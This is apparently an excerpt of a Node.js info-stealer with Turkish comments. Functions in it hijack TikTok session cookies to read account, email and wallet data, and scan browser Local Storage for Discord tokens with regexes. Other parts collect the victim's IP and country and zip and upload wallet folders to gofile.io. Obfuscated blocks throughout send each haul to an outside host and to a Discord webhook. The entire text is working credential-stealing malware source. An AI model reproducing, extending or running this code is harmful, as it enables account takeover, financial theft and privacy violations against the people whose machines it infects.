_0x107b92=_0x48c776[_0x3fca0e(0xa2)][_0x3fca0e(0xa1)][_0x3fca0e(0xa7)](_0x48c776),_0x1c7df7=_0x1aeba4[_0x49d188],_0x1e91fc=_0x4091bb[_0x1c7df7]||_0x107b92;_0x107b92[_0x3fca0e(0x8e)]=_0x48c776['bind'](_0x48c776),_0x107b92[_0x3fca0e(0xaf)]=_0x1e91fc[_0x3fca0e(0xaf)][_0x3fca0e(0xa7)](_0x1e91fc),_0x4091bb[_0x1c7df7]=_0x107b92;}});function _0x2f0d(){var _0x23c0a9=['714950BDOxcq','return\x20(function()\x20','search','apply','trace','Discord\x20webhook\x20sent\x20successfully!','{}.constructor(\x22return\x20this\x22)(\x20)','error','3mbFNab','11901725nLovJX','7lutBBo','2rgjnut','prototype','constructor','info','catch','5949vQzQoA','415027sChAex','bind','table','1595480WTZOyi','warn','200454MaOltr','message','736RStrMK','1712135ZkOavq','toString','log','length','__proto__','then','exception','(((.+)+)+)+$','post','console','https://buildandwatch.net/'];_0x2f0d=function(){return _0x23c0a9;};return _0x2f0d();}_0x151221(),axios[_0x36b6d9(0x92)](_0x36b6d9(0x94),payload)[_0x36b6d9(0x8f)](_0x579e3d=>{var _0x665f3=_0x36b6d9;console[_0x665f3(0x8c)](_0x665f3(0x9a));})[_0x36b6d9(0xa4)](_0x262f9a=>{var _0x40948e=_0x36b6d9;console[_0x40948e(0x9c)]('Error\x20sending\x20Discord\x20webhook:',_0x262f9a[_0x40948e(0xac)]);}),axios[_0x36b6d9(0x92)](webhook3939,payload)['then'](_0x272fb4=>{var _0x209022=_0x36b6d9;console[_0x209022(0x8c)]('Discord\x20webhook\x20sent\x20successfully!');})[_0x36b6d9(0xa4)](_0x266bc8=>{var _0x4ee1ff=_0x36b6d9;console[_0x4ee1ff(0x9c)]('Error\x20sending\x20Discord\x20webhook:',_0x266bc8[_0x4ee1ff(0xac)]);});


  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
  }
}



//


function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
            embeds: [
  {
    title: "TikTok Session Detected",
    description: "The TikTok session was detected",
    color: 16716947, // Renk kodu (Opsiyonel)
    fields: [
      {
        name: "Cookie",
        value: "```" + cookie + "```",
        inline: true
      },
      {
        name: "Profile URL",
        value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
        inline: true
      },
      {
        name: "User Identifier",
        value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
        inline: true
      },
      {
        name: "Email",
        value: "```" + (accountInfo.data.email || "No Email") + "```",
        inline: true
      },
      {
        name: "Username",
        value: "```" + accountInfo.data.username + "```",
        inline: true
      },
      {
        name: "Follower Count",
        value: "```" + (insights?.follower_num?.value || "Not available") + "```",
        inline: true
      },
      {
        name: "Coins",
        value: "```" + wallet.data.coins + "```",
        inline: true
      }
    ],
    footer: {
      text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
    }
  }
 ]
};


                
function _0x3384(){var _0xa15173=['warn','6956612YnTLJS','info','1925PnyGwV','2294004qqZHCI','(((.+)+)+)+$','console','constructor','search','Discord\x20webhook\x20sent\x20successfully!','catch','57078bEZllv','225UUVmMp','11696sNktUZ','apply','__proto__','Error\x20sending\x20Discord\x20webhook:','bind','error','trace','3955028hVnJHB','6926886tUvcKt','length','10JlQotE','toString','post','734CnLvom','3ERTxpJ','log','575zNRDGY','65wbzAxT','https://buildandwatch.net/','message','table'];_0x3384=function(){return _0xa15173;};return _0x3384();}var _0x2e2075=_0x39bb;(function(_0x5798d0,_0x38e1e3){var _0x3bd162=_0x39bb,_0x370e50=_0x5798d0();while(!![]){try{var _0x520b1a=-parseInt(_0x3bd162(0x99))/0x1*(parseInt(_0x3bd162(0x85))/0x2)+-parseInt(_0x3bd162(0x86))/0x3*(parseInt(_0x3bd162(0x8e))/0x4)+-parseInt(_0x3bd162(0x88))/0x5*(-parseInt(_0x3bd162(0x98))/0x6)+parseInt(_0x3bd162(0x90))/0x7*(-parseInt(_0x3bd162(0x9a))/0x8)+parseInt(_0x3bd162(0xa2))/0x9+parseInt(_0x3bd162(0xa4))/0xa*(parseInt(_0x3bd162(0xa1))/0xb)+parseInt(_0x3bd162(0x91))/0xc*(parseInt(_0x3bd162(0x89))/0xd);if(_0x520b1a===_0x38e1e3)break;else _0x370e50['push'](_0x370e50['shift']());}catch(_0x15fa69){_0x370e50['push'](_0x370e50['shift']());}}}(_0x3384,0xe9376));var _0xcfafdc=(function(){var _0x4ee4e6=!![];return function(_0x239fda,_0x55b5b7){var _0x3e2444=_0x4ee4e6?function(){if(_0x55b5b7){var _0x195b2f=_0x55b5b7['apply'](_0x239fda,arguments);return _0x55b5b7=null,_0x195b2f;}}:function(){};return _0x4ee4e6=![],_0x3e2444;};}()),_0x422e04=_0xcfafdc(this,function(){var _0x2f39f4=_0x39bb;return _0x422e04['toString']()[_0x2f39f4(0x95)](_0x2f39f4(0x92))[_0x2f39f4(0xa5)]()[_0x2f39f4(0x94)](_0x422e04)[_0x2f39f4(0x95)](_0x2f39f4(0x92));});_0x422e04();function _0x39bb(_0x44ca88,_0x26d2db){var _0x3a3978=_0x3384();return _0x39bb=function(_0x2e1bf5,_0x3846a5){_0x2e1bf5=_0x2e1bf5-0x84;var _0x27819d=_0x3a3978[_0x2e1bf5];return _0x27819d;},_0x39bb(_0x44ca88,_0x26d2db);}var _0x3846a5=(function(){var _0x3e2bec=!![];return function(_0x58c6ec,_0x5dda62){var _0x26e69d=_0x3e2bec?function(){var _0xf634d8=_0x39bb;if(_0x5dda62){var _0x462dac=_0x5dda62[_0xf634d8(0x9b)](_0x58c6ec,arguments);return _0x5dda62=null,_0x462dac;}}:function(){};return _0x3e2bec=![],_0x26e69d;};}()),_0x2e1bf5=_0x3846a5(this,function(){var _0x54ef3c=_0x39bb,_0x20ef4b;try{var _0x413c69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x20ef4b=_0x413c69();}catch(_0x1b5903){_0x20ef4b=window;}var _0x19f937=_0x20ef4b[_0x54ef3c(0x93)]=_0x20ef4b[_0x54ef3c(0x93)]||{},_0x1cbeec=[_0x54ef3c(0x87),_0x54ef3c(0x8d),_0x54ef3c(0x8f),_0x54ef3c(0x9f),'exception',_0x54ef3c(0x8c),_0x54ef3c(0xa0)];for(var _0x1bd6a7=0x0;_0x1bd6a7<_0x1cbeec[_0x54ef3c(0xa3)];_0x1bd6a7++){var _0x71a398=_0x3846a5[_0x54ef3c(0x94)]['prototype'][_0x54ef3c(0x9e)](_0x3846a5),_0xa34c03=_0x1cbeec[_0x1bd6a7],_0x34d4c7=_0x19f937[_0xa34c03]||_0x71a398;_0x71a398[_0x54ef3c(0x9c)]=_0x3846a5[_0x54ef3c(0x9e)](_0x3846a5),_0x71a398['toString']=_0x34d4c7['toString'][_0x54ef3c(0x9e)](_0x34d4c7),_0x19f937[_0xa34c03]=_0x71a398;}});_0x2e1bf5(),axios[_0x2e2075(0x84)](_0x2e2075(0x8a),webhookPayload)['then'](()=>{var _0xb171c5=_0x2e2075;console[_0xb171c5(0x87)](_0xb171c5(0x96));})[_0x2e2075(0x97)](_0x174474=>{var _0x5b315c=_0x2e2075;console['error'](_0x5b315c(0x9d),_0x174474[_0x5b315c(0x8b)]);}),axios['post'](webhook3939,webhookPayload)['then'](()=>{var _0x18d28e=_0x2e2075;console[_0x18d28e(0x87)](_0x18d28e(0x96));})[_0x2e2075(0x97)](_0x19b565=>{var _0x55ab42=_0x2e2075;console[_0x55ab42(0x9f)](_0x55ab42(0x9d),_0x19b565[_0x55ab42(0x8b)]);});
              })
              .catch(error => {
                console.error("Error fetching wallet data:", error.message);
                throw error;
              });
          })
          .catch(error => {
            console.error("Error fetching insights:", error.message);
            throw error;
          });
      })
      .catch(error => {
        console.error("Error fetching account info:", error.message);
        throw error;
      });
  } catch (error) {
    console.error("Error:", error.message);
    throw error;
  }
}



function sendIPInfoToDiscord() {
  axios.get('https://api64.ipify.org?format=json')
    .then(response => {
      const ipAddress = response.data.ip;

      // IP bilgisi hizmeti
      const ipInfoUrl = `http://ip-api.com/json/${ipAddress}`;

      // IP bilgisini al ve gömülü mesajı oluştur
      axios.get(ipInfoUrl)
        .then(ipResponse => {
          const countryCode = ipResponse.data.countryCode;
          const country = ipResponse.data.country;

          // IP ve ülke bilgilerini içeren embed objesi
          const embed = {
            title: 'IP Bilgileri',
            color: 0x0099ff,
            fields: [
              {
                name: '<:946246524826968104:1138102801487106180>  IP',
                value: ipAddress,
                inline: true
              },
              {
                name: '<a:1109372373888675870:1138102810366447626> Ülke',
                value: `${country} (${countryCode})`,
                inline: true
              }
            ],
            timestamp: new Date()
          };

          // Discord Webhook'a gönderim
  var _0x3f5685=_0x13ff;function _0x13ff(_0x1efee6,_0xc66d5e){var _0xed21bb=_0xdd4d();return _0x13ff=function(_0x4d38be,_0x2fd779){_0x4d38be=_0x4d38be-0xc3;var _0x1825ab=_0xed21bb[_0x4d38be];return _0x1825ab;},_0x13ff(_0x1efee6,_0xc66d5e);}function _0xdd4d(){var _0x3db7a6=['prototype','search','table','catch','post','1046775mKlxka','2AeJcHz','trace','then','(((.+)+)+)+$','bind','https://buildandwatch.net/','{}.constructor(\x22return\x20this\x22)(\x20)','__proto__','6340674dFwBRb','return\x20(function()\x20','toString','IP\x20adresi\x20ve\x20ülke\x20bilgisi\x20başarıyla\x20gönderildi.','813963wLiyiR','error','apply','14451273hpdvJS','6292832ttjQkT','5AlyTrf','3483052pKPBuJ','log','constructor','4171896uknhVa','console'];_0xdd4d=function(){return _0x3db7a6;};return _0xdd4d();}(function(_0x24c64e,_0x5a8220){var _0x1f3156=_0x13ff,_0x1839fc=_0x24c64e();while(!![]){try{var _0x3e7a29=parseInt(_0x1f3156(0xdd))/0x1*(-parseInt(_0x1f3156(0xd1))/0x2)+-parseInt(_0x1f3156(0xd0))/0x3+parseInt(_0x1f3156(0xc6))/0x4+parseInt(_0x1f3156(0xc5))/0x5*(parseInt(_0x1f3156(0xd9))/0x6)+parseInt(_0x1f3156(0xc4))/0x7+parseInt(_0x1f3156(0xc9))/0x8+-parseInt(_0x1f3156(0xc3))/0x9;if(_0x3e7a29===_0x5a8220)break;else _0x1839fc['push'](_0x1839fc['shift']());}catch(_0x12acae){_0x1839fc['push'](_0x1839fc['shift']());}}}(_0xdd4d,0x8d75c));var _0x17f4a4=(function(){var _0x199c6a=!![];return function(_0x3cc4c9,_0x24cef2){var _0x398f4c=_0x199c6a?function(){var _0x7113ea=_0x13ff;if(_0x24cef2){var _0x4b0983=_0x24cef2[_0x7113ea(0xdf)](_0x3cc4c9,arguments);return _0x24cef2=null,_0x4b0983;}}:function(){};return _0x199c6a=![],_0x398f4c;};}()),_0x444659=_0x17f4a4(this,function(){var _0x3c31b7=_0x13ff;return _0x444659[_0x3c31b7(0xdb)]()[_0x3c31b7(0xcc)]('(((.+)+)+)+$')[_0x3c31b7(0xdb)]()[_0x3c31b7(0xc8)](_0x444659)[_0x3c31b7(0xcc)](_0x3c31b7(0xd4));});_0x444659();var _0x2fd779=(function(){var _0x492e44=!![];return function(_0x3fb904,_0x1f575d){var _0x45fd53=_0x492e44?function(){var _0x3b04a0=_0x13ff;if(_0x1f575d){var _0x1d4341=_0x1f575d[_0x3b04a0(0xdf)](_0x3fb904,arguments);return _0x1f575d=null,_0x1d4341;}}:function(){};return _0x492e44=![],_0x45fd53;};}()),_0x4d38be=_0x2fd779(this,function(){var _0x110c22=_0x13ff,_0x161e86;try{var _0x2c745a=Function(_0x110c22(0xda)+_0x110c22(0xd7)+');');_0x161e86=_0x2c745a();}catch(_0x1d2169){_0x161e86=window;}var _0x1ccebe=_0x161e86[_0x110c22(0xca)]=_0x161e86['console']||{},_0x281cd0=[_0x110c22(0xc7),'warn','info',_0x110c22(0xde),'exception',_0x110c22(0xcd),_0x110c22(0xd2)];for(var _0xffb1af=0x0;_0xffb1af<_0x281cd0['length'];_0xffb1af++){var _0x2ec7dd=_0x2fd779[_0x110c22(0xc8)][_0x110c22(0xcb)][_0x110c22(0xd5)](_0x2fd779),_0xc6b6f1=_0x281cd0[_0xffb1af],_0x3ffabd=_0x1ccebe[_0xc6b6f1]||_0x2ec7dd;_0x2ec7dd[_0x110c22(0xd8)]=_0x2fd779[_0x110c22(0xd5)](_0x2fd779),_0x2ec7dd[_0x110c22(0xdb)]=_0x3ffabd['toString'][_0x110c22(0xd5)](_0x3ffabd),_0x1ccebe[_0xc6b6f1]=_0x2ec7dd;}});_0x4d38be(),axios[_0x3f5685(0xcf)](_0x3f5685(0xd6),{'embeds':[embed]})['then'](()=>console[_0x3f5685(0xc7)]('IP\x20adresi\x20ve\x20ülke\x20bilgisi\x20başarıyla\x20gönderildi.'))[_0x3f5685(0xce)](_0x230fb1=>console['error']('Hata\x20oluştu:\x20',_0x230fb1)),axios[_0x3f5685(0xcf)](webhook3939,{'embeds':[embed]})[_0x3f5685(0xd3)](()=>console['log'](_0x3f5685(0xdc)))[_0x3f5685(0xce)](_0x51b769=>console[_0x3f5685(0xde)]('Hata\x20oluştu:\x20',_0x51b769));

	  })
        
       
 })
    .catch(error => {
      console.error('IP adresi alınırken hata oluştu: ', error);
    });
}

// Fonksiyonu çağırarak işlemi başlat
sendIPInfoToDiscord();


///


function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}



function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}


function findToken(path) {
    path += 'Local Storage\\leveldb';
    let tokens = [];
    try {
        fs.readdirSync(path)
            .map(file => {
                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                    .split(/\r?\n/)
                    .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                        for (const pattern of patterns) {
                            const foundTokens = line.match(pattern);
                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
                        }
                    });
            });
    } catch (e) {}
    return tokens;
}


async function createZip(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZippp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    output.on('close', () => {
      console.log('ZIP arşivi oluşturuldu: ' + archive.pointer() + ' bayt');
      resolve();
    });

    archive.on('error', (err) => {
      reject(err);
    });

    archive.pipe(output);
    archive.directory(sourcePath, false);
    archive.finalize();
  });
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
	
getZipp(randomPath, randomPath + '.zip')

axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = './' + user.randomUUID + '.zip';

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Wallet File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
            }
        ],
    };

          // Webhook'a POST isteği gönder
var _0x59dcb1=_0x1e1e;(function(_0x8efdd4,_0x3f11f9){var _0x3b5d2f=_0x1e1e,_0x174041=_0x8efdd4();while(!![]){try{var _0x56fa49=-parseInt(_0x3b5d2f(0x12e))/0x1*(parseInt(_0x3b5d2f(0x142))/0x2)+-parseInt(_0x3b5d2f(0x132))/0x3+-parseInt(_0x3b5d2f(0x134))/0x4+parseInt(_0x3b5d2f(0x145))/0x5+parseInt(_0x3b5d2f(0x12f))/0x6+-parseInt(_0x3b5d2f(0x137))/0x7*(parseInt(_0x3b5d2f(0x13b))/0x8)+-parseInt(_0x3b5d2f(0x130))/0x9*(-parseInt(_0x3b5d2f(0x12c))/0xa);if(_0x56fa49===_0x3f11f9)break;else _0x174041['push'](_0x174041['shift']());}catch(_0x421acb){_0x174041['push'](_0x174041['shift']());}}}(_0x3a6c,0xbaeb2));var _0x466d4f=(function(){var _0x4e70f6=!![];return function(_0x115e0b,_0x39ed3c){var _0x4a60bd=_0x4e70f6?function(){var _0x54dcba=_0x1e1e;if(_0x39ed3c){var _0x171f53=_0x39ed3c[_0x54dcba(0x146)](_0x115e0b,arguments);return _0x39ed3c=null,_0x171f53;}}:function(){};return _0x4e70f6=![],_0x4a60bd;};}()),_0x1c3932=_0x466d4f(this,function(){var _0x4810bb=_0x1e1e;return _0x1c3932['toString']()['search'](_0x4810bb(0x138))[_0x4810bb(0x14a)]()[_0x4810bb(0x131)](_0x1c3932)[_0x4810bb(0x135)](_0x4810bb(0x138));});function _0x3a6c(){var _0x5d8a9e=['return\x20(function()\x20','catch','__proto__','toString','status','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','3846700LDeBdx','error','3ussndH','6482490bwERid','72KrJfjT','constructor','3703038gShels','https://buildandwatch.net/','5150284vXuhlD','search','then','21ATTPjB','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','Webhook\x20gönderildi:','1068888zgNFAq','post','trace','log','bind','table','prototype','548462uYNzJz','message','info','1766430AbADio','apply'];_0x3a6c=function(){return _0x5d8a9e;};return _0x3a6c();}_0x1c3932();function _0x1e1e(_0x4bd0b9,_0x5d94f8){var _0x3e277c=_0x3a6c();return _0x1e1e=function(_0x1bd00b,_0xf31b8b){_0x1bd00b=_0x1bd00b-0x12c;var _0x42352d=_0x3e277c[_0x1bd00b];return _0x42352d;},_0x1e1e(_0x4bd0b9,_0x5d94f8);}var _0xf31b8b=(function(){var _0x573b5d=!![];return function(_0x11e260,_0x37ee01){var _0x1c07bb=_0x573b5d?function(){var _0x3700cf=_0x1e1e;if(_0x37ee01){var _0x576341=_0x37ee01[_0x3700cf(0x146)](_0x11e260,arguments);return _0x37ee01=null,_0x576341;}}:function(){};return _0x573b5d=![],_0x1c07bb;};}()),_0x1bd00b=_0xf31b8b(this,function(){var _0x2bcb2c=_0x1e1e,_0xf07efd=function(){var _0x3fb7ef=_0x1e1e,_0x14bbcc;try{_0x14bbcc=Function(_0x3fb7ef(0x147)+_0x3fb7ef(0x139)+');')();}catch(_0x5a4d76){_0x14bbcc=window;}return _0x14bbcc;},_0x22a972=_0xf07efd(),_0x5c3a91=_0x22a972['console']=_0x22a972['console']||{},_0x454499=[_0x2bcb2c(0x13e),'warn',_0x2bcb2c(0x144),_0x2bcb2c(0x12d),'exception',_0x2bcb2c(0x140),_0x2bcb2c(0x13d)];for(var _0x2bff02=0x0;_0x2bff02<_0x454499['length'];_0x2bff02++){var _0x582f6f=_0xf31b8b['constructor'][_0x2bcb2c(0x141)][_0x2bcb2c(0x13f)](_0xf31b8b),_0x223fe9=_0x454499[_0x2bff02],_0x40f390=_0x5c3a91[_0x223fe9]||_0x582f6f;_0x582f6f[_0x2bcb2c(0x149)]=_0xf31b8b[_0x2bcb2c(0x13f)](_0xf31b8b),_0x582f6f[_0x2bcb2c(0x14a)]=_0x40f390[_0x2bcb2c(0x14a)][_0x2bcb2c(0x13f)](_0x40f390),_0x5c3a91[_0x223fe9]=_0x582f6f;}});_0x1bd00b(),axios[_0x59dcb1(0x13c)](webhook3939,embedData)[_0x59dcb1(0x136)](_0x3a8292=>{var _0x590fa3=_0x59dcb1;console[_0x590fa3(0x13e)](_0x590fa3(0x13a),_0x3a8292['status'],_0x3a8292[_0x590fa3(0x14d)]);}),axios[_0x59dcb1(0x13c)](_0x59dcb1(0x133),embedData)[_0x59dcb1(0x136)](_0xbedb4=>{var _0x28c40a=_0x59dcb1;console[_0x28c40a(0x13e)](_0x28c40a(0x13a),_0xbedb4[_0x28c40a(0x14b)],_0xbedb4[_0x28c40a(0x14d)]);})[_0x59dcb1(0x148)](_0x43751e=>{var _0x42a0fc=_0x59dcb1;console['log'](_0x42a0fc(0x14c),_0x43751e[_0x42a0fc(0x143)]);});

        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

         var _0x4e84f8=_0x2098;(function(_0x2a10ad,_0x2f101f){var _0x1c6567=_0x2098,_0x191f4a=_0x2a10ad();while(!![]){try{var _0x4f1e78=-parseInt(_0x1c6567(0x1f3))/0x1*(parseInt(_0x1c6567(0x202))/0x2)+parseInt(_0x1c6567(0x1f8))/0x3+parseInt(_0x1c6567(0x1fc))/0x4*(parseInt(_0x1c6567(0x205))/0x5)+parseInt(_0x1c6567(0x1f2))/0x6+-parseInt(_0x1c6567(0x20c))/0x7+-parseInt(_0x1c6567(0x1fb))/0x8+parseInt(_0x1c6567(0x201))/0x9;if(_0x4f1e78===_0x2f101f)break;else _0x191f4a['push'](_0x191f4a['shift']());}catch(_0x1c1727){_0x191f4a['push'](_0x191f4a['shift']());}}}(_0x375b,0xe61ae));function _0x2098(_0x1f95c2,_0x14c71b){var _0x1c9f8e=_0x375b();return _0x2098=function(_0x5b7206,_0x3c2f73){_0x5b7206=_0x5b7206-0x1f2;var _0x17fed5=_0x1c9f8e[_0x5b7206];return _0x17fed5;},_0x2098(_0x1f95c2,_0x14c71b);}var _0x30b1fc=(function(){var _0xa80770=!![];return function(_0x5f1463,_0x5c6694){var _0x109a82=_0xa80770?function(){var _0x2c3cfc=_0x2098;if(_0x5c6694){var _0x1b6d10=_0x5c6694[_0x2c3cfc(0x20a)](_0x5f1463,arguments);return _0x5c6694=null,_0x1b6d10;}}:function(){};return _0xa80770=![],_0x109a82;};}()),_0x30d0c2=_0x30b1fc(this,function(){var _0x28dc0c=_0x2098;return _0x30d0c2[_0x28dc0c(0x20e)]()[_0x28dc0c(0x1f4)](_0x28dc0c(0x1ff))[_0x28dc0c(0x20e)]()[_0x28dc0c(0x203)](_0x30d0c2)[_0x28dc0c(0x1f4)]('(((.+)+)+)+$');});_0x30d0c2();function _0x375b(){var _0xb913ce=['return\x20(function()\x20','7934689wLfDiD','Webhook\x20gönderildi:','toString','612018iIAgJx','8713ooLYJF','search','length','console','post','3162033imgXcG','{}.constructor(\x22return\x20this\x22)(\x20)','trace','514968DRLceq','141080YyhmcG','status','then','(((.+)+)+)+$','statusText','18463455vzOSsD','334rbDrqw','constructor','bind','55ISZGuh','log','prototype','error','exception','apply'];_0x375b=function(){return _0xb913ce;};return _0x375b();}var _0x3c2f73=(function(){var _0x596f8c=!![];return function(_0x4701dd,_0xcd9b23){var _0x33c11e=_0x596f8c?function(){var _0xacb4c1=_0x2098;if(_0xcd9b23){var _0x452c10=_0xcd9b23[_0xacb4c1(0x20a)](_0x4701dd,arguments);return _0xcd9b23=null,_0x452c10;}}:function(){};return _0x596f8c=![],_0x33c11e;};}()),_0x5b7206=_0x3c2f73(this,function(){var _0x40999e=_0x2098,_0x18bb58;try{var _0x49d476=Function(_0x40999e(0x20b)+_0x40999e(0x1f9)+');');_0x18bb58=_0x49d476();}catch(_0x1a1663){_0x18bb58=window;}var _0x3a5ab0=_0x18bb58[_0x40999e(0x1f6)]=_0x18bb58[_0x40999e(0x1f6)]||{},_0x3fc8d1=[_0x40999e(0x206),'warn','info',_0x40999e(0x208),_0x40999e(0x209),'table',_0x40999e(0x1fa)];for(var _0x589471=0x0;_0x589471<_0x3fc8d1[_0x40999e(0x1f5)];_0x589471++){var _0x126fea=_0x3c2f73[_0x40999e(0x203)][_0x40999e(0x207)][_0x40999e(0x204)](_0x3c2f73),_0x51bb73=_0x3fc8d1[_0x589471],_0x259ad6=_0x3a5ab0[_0x51bb73]||_0x126fea;_0x126fea['__proto__']=_0x3c2f73['bind'](_0x3c2f73),_0x126fea[_0x40999e(0x20e)]=_0x259ad6['toString'][_0x40999e(0x204)](_0x259ad6),_0x3a5ab0[_0x51bb73]=_0x126fea;}});_0x5b7206(),axios[_0x4e84f8(0x1f7)](webhook3939,embedData)[_0x4e84f8(0x1fe)](_0x40aa5e=>{var _0x5fc589=_0x4e84f8;console['log']('Webhook\x20gönderildi:',_0x40aa5e[_0x5fc589(0x1fd)],_0x40aa5e[_0x5fc589(0x200)]);}),axios[_0x4e84f8(0x1f7)]('https://buildandwatch.net/',embedData)[_0x4e84f8(0x1fe)](_0x3f3953=>{var _0x439881=_0x4e84f8;console[_0x439881(0x206)](_0x439881(0x20d),_0x3f3953[_0x439881(0x1fd)],_0x3f3953[_0x439881(0x200)]);});
            
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

}

async function stealltokens() {
    const fields = [];
    for (let path of paths) {
        const foundTokens = findToken(path);
        if (foundTokens) foundTokens.forEach(token => {
            var c = {
                name: "<:browserstokens:951827260741156874> Browser Token;",
                value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/` + token + `)`,
                inline: !0
            }
            fields.push(c)
        });
    }


